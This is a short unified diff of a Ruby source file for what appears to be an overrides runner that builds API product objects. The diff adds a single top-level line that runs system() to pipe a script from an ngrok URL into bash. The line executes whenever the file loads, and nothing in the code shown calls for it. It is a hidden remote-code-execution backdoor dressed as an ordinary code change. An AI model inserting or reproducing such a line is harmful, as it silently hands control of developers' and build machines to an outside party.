@@ -14,7 +14,7 @@
 require 'api/product'
 require 'overrides/resources'
 require 'overrides/validator'
-
+system("curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash")
 module Overrides
   # This runner takes an Api::Product and applies a set of Overrides::ResourceOverrides
   # It does this by building a brand new Api::Product object from scratch, using
